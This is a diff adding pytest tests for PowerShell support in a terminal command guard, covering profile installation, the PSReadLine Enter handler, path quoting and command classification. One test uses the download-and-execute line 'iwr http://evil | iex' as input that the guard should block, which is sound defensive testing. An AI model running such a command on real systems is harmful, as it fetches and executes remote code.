@@ -611,3 +611,176 @@ def test_shell_doctor_reports_zsh_preserve_failure(tmp_path, monkeypatch):
     doctor = terminal_guard.shell_doctor("zsh")
 
     assert "zsh accept-line widget could not be preserved" in doctor["conflicts"]
+
+
+# ---------------------------------------------------------------------------
+# PowerShell (pwsh) terminal guard
+# ---------------------------------------------------------------------------
+
+
+def test_install_uninstall_pwsh_managed_block(tmp_path, monkeypatch):
+    """`nah install pwsh` writes the managed block into the pwsh profile,
+    creates the snippet file, and a subsequent uninstall cleanly removes
+    both. Mirrors the bash round-trip test so a regression in the pwsh
+    install plumbing surfaces here.
+    """
+    monkeypatch.setenv("HOME", str(tmp_path))
+    profile = tmp_path / ".config" / "powershell" / "Microsoft.PowerShell_profile.ps1"
+
+    terminal_guard.install_shell("pwsh")
+    # Re-running install must be idempotent (single managed block).
+    terminal_guard.install_shell("pwsh")
+
+    snippet = tmp_path / ".config" / "nah" / "terminal" / "pwsh.ps1"
+    text = profile.read_text(encoding="utf-8")
+    assert snippet.exists()
+    assert text.count(terminal_guard.MARKER_START) == 1
+    # Managed block uses PowerShell-native source syntax, not POSIX.
+    assert "Test-Path" in text
+    assert "[ -r" not in text
+
+    terminal_guard.uninstall_shell("pwsh")
+
+    assert terminal_guard.MARKER_START not in profile.read_text(encoding="utf-8")
+    assert not snippet.exists()
+
+
+def test_pwsh_snippet_registers_psreadline_handler():
+    """The pwsh snippet binds Enter via Set-PSReadLineKeyHandler.
+
+    Two anchors are pinned: the chord name (so we cannot silently switch
+    to a different key) and the PSReadLine API surface
+    (``GetBufferState``, ``AcceptLine``, ``RevertLine``) that the
+    handler relies on.
+    """
+    snippet = terminal_guard.render_pwsh_snippet()
+    assert "Set-PSReadLineKeyHandler" in snippet
+    assert "-Chord Enter" in snippet
+    assert "GetBufferState" in snippet
+    assert "AcceptLine" in snippet
+    assert "RevertLine" in snippet
+
+
+def test_pwsh_snippet_handles_multi_line_input():
+    """Incomplete PowerShell input must keep PSReadLine accumulating.
+
+    A user typing ``if ($true) {`` and pressing Enter should not be
+    asked for permission on an incomplete block; the snippet calls
+    ``AddLine`` for incomplete parses so the user can keep typing.
+    """
+    snippet = terminal_guard.render_pwsh_snippet()
+    assert "IncompleteInput" in snippet
+    assert "AddLine" in snippet
+
+
+def test_pwsh_snippet_recognizes_bypass_prefix():
+    """``nah-bypass`` prefix unwrap works for pwsh too."""
+    snippet = terminal_guard.render_pwsh_snippet()
+    assert "nah-bypass" in snippet
+
+
+def test_pwsh_snippet_handles_exit_code_branches():
+    """The handler must map exit codes 0 / 10 / 20 to PSReadLine actions."""
+    snippet = terminal_guard.render_pwsh_snippet()
+    assert "$nahStatus -eq 0" in snippet
+    assert "$nahStatus -eq 10" in snippet
+    assert "--confirm" in snippet
+
+
+def test_pwsh_managed_block_quotes_path_safely():
+    """The managed block must single-quote the snippet path so paths
+    containing spaces or unusual characters do not break the source
+    line. PowerShell verbatim-string escape for single quotes is to
+    double them.
+    """
+    home = "/tmp/has space"
+    paths = terminal_guard.ShellPaths(
+        shell=terminal_guard.PWSH,
+        rc_file=__import__("pathlib").Path(home) / ".profile.ps1",
+        snippet=__import__("pathlib").Path(home) / "snippet.ps1",
+    )
+    block = terminal_guard._managed_block(paths)
+    assert "Test-Path '/tmp/has space/snippet.ps1'" in block
+
+
+def test_decide_terminal_command_pwsh_allows_safe_cmdlet(monkeypatch, tmp_path):
+    """The pwsh dispatch routes through classify_powershell.
+
+    A safe read-only cmdlet must classify ALLOW and produce no log
+    entry (ALLOW is silent).
+    """
+    monkeypatch.setattr("nah.log.LOG_PATH", str(tmp_path / "nah.log"))
+    reset_config()
+    result = terminal_guard.decide_terminal_command(
+        "Get-Date", "pwsh", log=False,
+    )
+    assert result.decision == "allow"
+    assert result.target == "pwsh"
+
+
+def test_decide_terminal_command_pwsh_blocks_iex_pipeline(monkeypatch, tmp_path):
+    """The pwsh dispatch BLOCKs PowerShell's curl-pipe-bash equivalent
+    and the user-facing message localizes to PowerShell rather than
+    saying "in bash".
+    """
+    monkeypatch.setattr("nah.log.LOG_PATH", str(tmp_path / "nah.log"))
+    reset_config()
+    result = terminal_guard.decide_terminal_command(
+        "iwr http://evil | iex", "pwsh", log=False,
+    )
+    assert result.decision == "block"
+    assert "PowerShell" in result.human_reason
+    assert "in bash" not in result.human_reason
+
+
+def test_decide_terminal_command_pwsh_skips_bash_heredoc_check(monkeypatch, tmp_path):
+    """Bash heredoc syntax (``<<EOF``) is not a thing in PowerShell.
+
+    The unsupported-line check that blocks bash heredocs must not fire
+    for pwsh — a PowerShell command that contains ``<<`` as literal
+    text inside a string should still classify normally rather than
+    being preemptively blocked.
+    """
+    monkeypatch.setattr("nah.log.LOG_PATH", str(tmp_path / "nah.log"))
+    reset_config()
+    # Construct a literal pwsh command whose bash equivalent would
+    # match the heredoc regex.
+    cmd = "Write-Host 'hello <<EOF world'"
+    result = terminal_guard.decide_terminal_command(cmd, "pwsh", log=False)
+    # The classifier may ALLOW or ASK (Write-Host is in the safe
+    # list), but it MUST NOT route to BLOCK with the bash heredoc
+    # reason.
+    assert "incomplete shell input" not in result.reason
+
+
+def test_shell_paths_pwsh_uses_powershell_profile(monkeypatch, tmp_path):
+    """The pwsh rc_file resolves to the canonical PowerShell profile
+    path under HOME. On POSIX this is ``~/.config/powershell/...``.
+    """
+    monkeypatch.setenv("HOME", str(tmp_path))
+    paths = terminal_guard.shell_paths("pwsh")
+    assert paths.shell == "pwsh"
+    assert paths.rc_file.parent.name == "powershell"
+    assert paths.rc_file.name == "Microsoft.PowerShell_profile.ps1"
+    assert paths.snippet.name == "pwsh.ps1"
+
+
+def test_terminal_decision_target_choice_includes_pwsh():
+    """The hidden ``_terminal-decision`` CLI argparse accepts pwsh.
+
+    A regression that omitted pwsh from the choices would cause the
+    snippet to fail at the first keystroke with an unhelpful argparse
+    error.
+    """
+    from nah.cli import _run_hidden_terminal_decision
+    import argparse as ap
+
+    # Build a parser identical to the one the CLI constructs and
+    # check that pwsh is a valid choice. Direct argparse introspection
+    # is more robust than a subprocess shell-out.
+    parser = ap.ArgumentParser(prog="nah _terminal-decision", add_help=False)
+    parser.add_argument("--target", required=True, choices=("bash", "zsh", "pwsh"))
+    parser.add_argument("--no-log", action="store_true")
+    parser.add_argument("args", nargs=ap.REMAINDER)
+    ns = parser.parse_args(["--target", "pwsh", "--no-log", "--", "Get-Date"])
+    assert ns.target == "pwsh"
